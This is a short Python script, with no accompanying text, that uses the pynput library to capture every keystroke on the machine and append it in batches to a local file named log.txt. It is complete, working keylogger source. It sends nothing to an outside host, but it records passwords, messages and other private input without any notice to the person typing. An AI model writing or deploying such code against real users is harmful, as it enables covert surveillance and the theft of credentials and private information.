import pynput.keyboard
log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f'[{key}]'
    if len(log) > 100:
        with open("log.txt", "a") as file:
            file.write(log)
        log = ""

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
